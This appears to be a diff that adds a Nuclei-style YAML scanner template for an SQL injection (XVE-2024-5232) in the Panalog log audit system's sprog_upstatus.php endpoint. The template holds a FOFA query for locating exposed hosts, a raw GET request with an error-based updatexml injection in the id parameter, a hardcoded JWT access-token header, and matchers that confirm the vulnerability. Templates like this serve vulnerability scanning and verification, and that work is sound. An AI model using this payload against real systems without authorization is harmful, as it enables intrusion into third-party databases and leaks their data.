@@ -1,0 +1,35 @@
+id: Panalog-sprog_upstatus-sql
+
+info:
+  name: Panalog 日志审计系统 sprog_upstatus.php SQL 注入漏洞(XVE-2024-5232)
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="Maintain/cloud_index.php"
+    Panabit /Maintain/sprog_upstatus.php 接口处的 id 参数存在 SQL 注入漏洞，可导致数据库信息泄露从而获取敏感信息，甚至可能被攻击者进一步利用造成更大危害。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/141159901
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /Maintain/sprog_upstatus.php?status=1&rdb=1&id=1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1) HTTP/1.1
+        Host: {{Hostname}}
+        Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'XPATH syntax error:'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
